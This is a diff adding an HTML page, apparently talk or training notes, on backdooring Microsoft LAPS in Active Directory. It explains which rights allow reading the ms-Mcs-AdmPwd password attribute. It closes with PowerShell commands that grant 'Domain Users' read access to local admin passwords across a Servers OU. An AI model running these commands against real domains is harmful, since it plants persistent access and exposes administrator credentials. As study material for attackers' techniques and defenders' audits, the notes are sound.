@@ -1,0 +1,41 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>LAPS Backdoor</title>
+</head><body>Local Administrator Password Solution<br/>
+Randomizes the machine's local admin password every 30 days<br/>
+&nbsp;&#09;Stored in <b>ms-Mcs-AdmPwd</b>&nbsp;attribute on computer objects<br/>
+<br/>
+Administered with the AdmPwd.PS cmdlets<br/>
+&nbsp;&#09;<b>Find-AdmPwdExtendedRights</b>&nbsp;"audits" who can read ms-Mcs-AdmPwd<br/>
+<br/>
+Who can read AdmPwd? *this is not a comprehensive list<ul><li><b>DS_CONTROL_ACCESS</b>&nbsp;where the ACE</li>
+<li style="list-style-type: none"><ul><li>applies to AdmPwd and all decendant computers</li>
+<li>applies to AdmPwd and all decendant objects</li>
+<li>applies to any object and all decendant objects</li>
+<li>applies to any object and all decendant computers</li>
+</ul>
+</li>
+<li>Above checks are also necessary for <b>GENERIC_ALL</b></li>
+<li>Object control == Ability to grant the above rights</li>
+<li style="list-style-type: none"><ul><li><b>YOU</b>&nbsp;are the owner</li>
+<li>You can <b>become</b>&nbsp;the owner</li>
+<li style="list-style-type: none"><ul><li>WriteDacl, WriteOwner</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+<b>Normal user can't access ms-Mcs-AdmPwd<br/>
+<br/>
+</b>Privileged attacker adds backdoor to Servers OU<br/>
+PS C:\&gt; $RawObject = Get-DomainOU -Raw Servers<br/>
+PS C:\&gt; $TargetObject = $RawObject.GetDirectoryEntry()<br/>
+PS C:\&gt; $AdmPwdGuid = (Get-DomainGUIDMap).GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name <br/>
+&gt;&gt; &#09;$ACE = New-ADObjectAccessControlEntry -InheritanceType Descendents ` -AccessControlType Allow -PrincipalIdentity "Domain Users" ` -Right ExtendedRight -ObjectType $AdmPwdGuid<br/>
+&gt;&gt; &#09;$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)<br/>
+&gt;&gt; &#09;$TargetObject.PsBase.CommitChanges()<br/>
+<br/>
+</body></html>
